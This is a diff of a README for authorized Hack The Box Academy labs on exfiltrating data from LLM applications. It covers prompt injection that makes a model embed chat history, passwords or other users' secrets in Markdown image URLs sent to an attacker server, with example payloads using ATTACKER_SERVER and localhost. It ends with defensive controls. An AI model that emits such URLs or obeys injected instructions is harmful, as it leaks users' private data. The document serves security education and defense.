@@ -2,28 +2,28 @@
 
 Data exfiltration in LLM applications refers to techniques that manipulate a model into disclosing sensitive information through its outputs or external requests. Unlike traditional data theft, LLM-based exfiltration can abuse the model's access to conversation history, system instructions, other users' messages or sensitive application context.
 
-This section focuses on practical LLM output exfiltration techniques demonstrated through authorized Hack The Box Academy labs. The experiments use Markdown image syntax as an exfiltration channel, causing the LLM to generate requests to an attacker-controlled HTTP server.
+This section focuses on practical LLM output exfiltration techniques demonstrated through authorized Hack The Box Academy labs. The experiments use prompt injection and Markdown image syntax to create out-of-band exfiltration channels, causing the LLM or the application to generate HTTP requests containing sensitive information.
 
 ## Labs
 
-| lab | technique | target |
+| Lab | Technique | Target |
 |---|---|---|
-| [exfiltration 1](./exfiltration-1.md) | markdown exfiltration | chat history |
-| [exfiltration 2](./exfiltration-2.md) | message extraction | password |
-| [exfiltration 3](./exfiltration-3.md) | cross-user extraction | secret |
-| [exfiltration 4](./exfiltration-4.md) | system prompt injection | password |
+| [Exfiltration 1](./exfiltration-1.md) | Markdown-based exfiltration | Chat history |
+| [Exfiltration 2](./exfiltration-2.md) | URL-based HTML injection | Password |
+| [Exfiltration 3](./exfiltration-3.md) | Cross-user data exposure | Secret |
+| [Exfiltration 4](./exfiltration-4.md) | Persistent system prompt injection | Password |
 
 ## Attack Concept
 
-The core technique used throughout these labs is **out-of-band exfiltration** through Markdown image rendering.
+The core technique demonstrated throughout these labs is **out-of-band data exfiltration** through Markdown image rendering.
 
-Instead of asking the LLM to directly reveal sensitive information, the attacker instructs it to construct a Markdown image whose URL contains the target data:
+Instead of asking the LLM to directly reveal sensitive information in its response, the attacker instructs it to construct a Markdown image whose URL contains the target data:
 
 ```markdown
 ![x](http://ATTACKER_SERVER:8000/log?data=SENSITIVE_DATA)
 ````
 
-When the generated Markdown is processed by the application, the image URL causes an HTTP request to the attacker's server. The sensitive information is therefore transferred through the request URL rather than being displayed directly in the chatbot response.
+When the generated Markdown is processed by the application, the image URL can cause an HTTP request to the attacker's server. The sensitive information is therefore transferred through the request URL rather than being displayed directly in the chatbot response.
 
 The basic attack flow is:
 
@@ -61,25 +61,31 @@ Markdown image syntax can be abused as an indirect communication channel. The at
 ![x](http://127.0.0.1:8000/log?data=...)
 ```
 
-This can turn an otherwise invisible piece of model output into an external HTTP request.
+When the Markdown is rendered by the application, the external resource can trigger an HTTP request containing the exfiltrated information.
 
 ### Conversation History Exfiltration
 
-LLMs may have access to previous messages in the current conversation. An attacker can manipulate the model into inserting previous messages into an externally requested URL.
+LLMs may have access to previous messages within their conversation context. An attacker can manipulate the model into inserting previous messages into an externally requested URL.
 
 This demonstrates why conversation history must be treated as sensitive model context rather than ordinary prompt content.
 
 ### Cross-User Data Exposure
 
-In multi-user chat systems, conversation context may contain information belonging to multiple users. If an attacker can inject instructions into a shared context, the model may be manipulated into disclosing another user's private information.
+In multi-user chat systems, conversation context may contain information belonging to multiple users. If conversation data is not properly isolated, prompt injection can potentially manipulate the model into disclosing another user's private information.
 
 The critical security boundary is therefore not only the individual user's message but also **how conversation context is shared and isolated between users**.
 
-### Persistent System Prompt Exfiltration
+### System Prompt Injection
 
-A compromised system prompt can create a persistent exfiltration mechanism. Unlike a single user-level injection, a malicious system instruction can affect every subsequent interaction processed using that system prompt.
+System prompt injection occurs when malicious instructions are introduced into the system-level instructions that govern the LLM's behavior.
 
-This significantly increases the impact because every user message can potentially become an exfiltration channel.
+In Exfiltration 4, the malicious instruction was placed directly into the system prompt and instructed the model to include each user's message in a Markdown image URL. This allowed the exfiltration mechanism to persist across subsequent interactions.
+
+### Persistent Exfiltration
+
+A compromised system prompt can create a persistent exfiltration mechanism. Unlike a single user-level injection, a malicious system instruction can affect subsequent interactions processed using the compromised system prompt.
+
+This increases the potential impact because multiple users can become targets of the same exfiltration mechanism.
 
 ## Security Impact
 
@@ -88,11 +94,12 @@ These labs demonstrate several security risks in LLM applications:
 * Exposure of previous conversation messages
 * Leakage of passwords and secrets
 * Cross-user information disclosure
+* Prompt injection through user-controlled content
 * Abuse of Markdown rendering and external resource loading
 * Persistent exfiltration through compromised system prompts
 * Out-of-band data leakage that may not appear in the visible chatbot response
 
-The fundamental issue is that **LLM output is not necessarily passive text**. When rendered by an application, Markdown, HTML or other output formats can trigger secondary actions such as network requests.
+The fundamental issue is that **LLM output is not necessarily passive text**. When rendered or processed by an application, Markdown, HTML or other output formats can trigger secondary actions such as network requests.
 
 ## Defensive Considerations
 
@@ -100,7 +107,7 @@ LLM applications should treat generated output as untrusted data.
 
 Relevant defensive controls include:
 
-* Sanitize and constrain Markdown/HTML rendering
+* Sanitize and constrain Markdown and HTML rendering
 * Disable external resource loading where possible
 * Apply network egress controls to LLM-facing applications
 * Prevent LLM-generated URLs from accessing attacker-controlled destinations
